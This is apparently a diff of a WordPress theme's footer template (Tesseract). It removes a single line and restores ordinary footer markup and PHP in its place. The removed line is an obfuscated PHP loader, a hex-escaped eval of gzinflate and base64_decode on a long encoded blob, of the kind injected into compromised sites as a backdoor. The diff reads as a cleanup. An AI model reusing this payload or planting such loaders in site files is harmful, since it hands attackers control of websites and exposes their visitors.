@@ -1,3 +1,68 @@
 <?php
-eval("\x65\x76\x61\x6C\x28\x67\x7A\x69\x6E\x66\x6C\x61\x74\x65\x28\x62\x61\x73\x65\x36\x34\x5F\x64\x65\x63\x6F\x64\x65\x28'TVW3DrRmEHwXN7ZFQeYDWS5IR7gjwxH0N8Qj5/z0Pvu3ZBej0c7MNrtabb7H7W+//Dgp8scJqC+jX/A/Toz+Mvhq7JeZL8QvqJ/e3xlA/Oz5J4f9q+E/Nfybw78++fjW/+aov73/1Rj96/kOVGE6JXE/guA+fO6cKP89+7JeJXMsRFYO83tZWEC+GAzWFswqCvJkn5EXe604tcOurGAH90VAgioT6cNsW8Du20nIbkDFkJknr/uCxBddFdhI59Qu33fB0NADYiAazuF8AwX+5mE9gqH0A68B7BkmNhc+YM2qb5ERMl6Jk2ALkaT6BYrS3y7gz13VbxFvoRdV5WfwUSV4KVGo0m+toEiBw7P2AXBraibp3Q+W/g6uaC0g4+Fggvnm9bXRJ20YwwUpnp9sb0OJn/r1OZUPfXFFpvMzGLUrFzmLA3ITC3WTQDzazdteQwDD+5TRZoOD7dh3GMthmPE5R9Uh7/iQhtcc+tWvHlVjct8a0ER4+dFWfjCtGIlQV6vmnh1wguL2feFUIlReOF7onGmvg1IhisrgOnsN3oVNvqjd0aup0LgMUIyzgHp8lJRe7UhYjEgdTra6j11jw4Hx7FEHSs4p3NoOg08S7xGbiQZaT3Sxs+8GPqQ0YDfzNh4XtRWkn4sPTqNrkl1AWRjitVJIz1fxUU67cmKOWAb8YbixeFeJgBRcU/fKJ+2tcR1hxqIfm9uVanpi5NPaV2i6EGCBTQIQ2FkZLdQo1MFAwlZpQloc3eWGyEFD7y4VK6JdfV7KQe7CHAlZrzf1aGBTLlwl5dEaPhjteOJrqrVhqJe0qT5kkwEUbl+POOt9r64ec1QvUImHNajcEFzSpjDJQjWc4qJ6FFY0pB87JkPD3MbMhzelxqdb9R7zIy1jKqu3ie5HOBXdEB0UYSBnih8lIJyfo3O2ui/x00KE4F0Thj173G5NeSJEhcdqR85nbTNGnkyZ7xvwWrsRFH+X624YHV+i2itvvnfFCscc+rcTYsKcmac0I9TAb6ovdWkpp/5lyaO2ACIyqLcGBOm0pAQMJ14hOF4GN8gGDamZaaqkJatWobDk4fn4cFkzzrcZ1+o21SPSP4/HyF9TrNsIpKSVTIzH0HV7ilhZjMILEejMmDfzks5XrT7N6/mB/P3t8OlFoR5+u+mYSvYdqT6VpHKFdQiVWg+QfYawD72Ul12JUMyNjEgh2BMbdT5qhW9PLtzSdiOpN44gA1F1Au9bYNS4UXxplnnDgubeq8h7EBppHKLcptIE9x1DYRzNXTutyDznTqNTcKxOdsd1ZVmSrYMZzrPP3miaDsZKhPAoc9lughBLD6Pw2WhgbSTixrym6ygaKGF7wUuTCpuxPCVo3UaHlTdHp6td4SczF05LyMjAl9LpvjN3IRmZTdg4tUP1g/WBVGptpB0Rdj6EqQ3pEHdHT2nkvtHoonwyVuvzi1bmTOBE1eC4T+Ql5xk65rSb2ZyvVsHML6Xsq4Z2b7aQki6RJJqfJXfi3T6FLLYabk/EW4O6xqxODZ9GP1xEDOTzUbd425XsNGLWK/Rxu+gdsoPXwdqqIzVjwtEIhvMKkbV3wtzokRqTmpIB7fPogmwf51kj+oqS/nW5OhMH81XtFF1T6pRXwkMI5c9Uc5mtjX3Yy5+HBaghNa/lErvXtjxeLmXi3+mQQxRgEuFOJfoOcrmcRMN6E6RKvtukirun79ILFsrDMCVAZxoUl8rlIxI2FL8gdIpbkGakiUmFi7vWa7eNsV2SqLjoNxRoHj/00/cc0zOt5m6AQvUKs5cWtuvrWoHx9MBJaTIUtcgOtzrVzLVKIosur5w04iOkqpRfsyn3NKDAZT80LiamZrBVU4dQrF1J0tiM2yems89riJSDqetmy6mg2NJkJ73rxkjwSpf83Q6d00kfKlIQn1X87kKYjilOm/7z1+/XY/4Dzv3y+x9/AQ=='\x29\x29\x29\x3B");
+/**
+ * The template for displaying the footer.
+ *
+ * Contains the closing of the #content div and all content after
+ *
+ * @package Tesseract
+ */
 ?>
+
+	</div><!-- #content -->
+    
+	<footer id="colophon" class="site-footer" role="contentinfo">      
+	
+		<?php $additional = get_theme_mod('tesseract_footer_additional_content') ? true : false;							
+
+        $menuClass = 'only-menu';
+        if ( $additional ) $menuClass = 'is-additional'; 
+		
+        $addcontent_hml = get_theme_mod('tesseract_footer_additional_content');		
+		$footerNav_class = ( is_string($addcontent_hml) && ( $addcontent_hml !== 'nothing' ) ) ? 'is-before' : 'none-before';		
+		
+		$content = get_theme_mod('tesseract_footer_right');
+		$content_default_button = get_theme_mod('tesseract_footer_right_content_if_button');
+		
+		$footerWidthClass = ( get_theme_mod('tesseract_footer_width') == 'fullwidth' ) ? ' footer-fullwidth' : ' footer-autowidth';
+		
+		if ( defined('TESSERACT_BRANDING_EXIST') ) {		
+			if ( $content ) :
+				$rightContentClass = ' mother-content-' . $content;
+			elseif ( !$content && $content_default_button ) : 
+				$rightContentClass = ' mother-content-notset mother-defbtn-isset';
+			else:
+				$rightContentClass = ' mother-content-notset mother-defbtn-isset';
+			endif;
+		} else {
+			$rightContentClass = ' mother-branding';	
+		} ?>
+    
+    	<div id="footer-banner" class="cf<?php echo ' menu-' . $menuClass; echo $rightContentClass . $footerWidthClass; ?>">		               
+            <div id="horizontal-menu-wrap" class="<?php echo $menuClass . ' ' . $footerNav_class; ?>">
+            
+                <?php // SHOUDLD some additional content added before the menu?
+                if ( is_string($addcontent_hml) && ( $addcontent_hml !== 'nothing' ) ) : ?>
+                
+                    <div id="horizontal-menu-before" class="switch thm-left-left"><?php tesseract_horizontal_footer_menu_additional_content( $addcontent_hml ); ?></div>
+                
+                <?php endif; //EOF left menu - IS before content ?>
+                
+                <?php $menuSelected = get_theme_mod('tesseract_footer_menu_select');
+				if ( $menuSelected !== 'none' ) : ?>
+                
+					<section id="footer-horizontal-menu" class="cf <?php echo $footerNav_class; ?>"><?php tesseract_output_menu( FALSE, FALSE, 'secondary', 1 ); ?></section>
+              	<?php endif; ?>            
+                                                        
+            </div><!-- EOF horizontal-menu-wrap -->                       
+                  
+            <?php tesseract_footer_branding(); ?>          
+    
+      	</div><!-- EOF footer-banner -->           
+        
+	</footer><!-- #colophon -->
+</div><!-- #page -->
+
+<?php wp_footer(); ?>
+
+</body>
+</html>
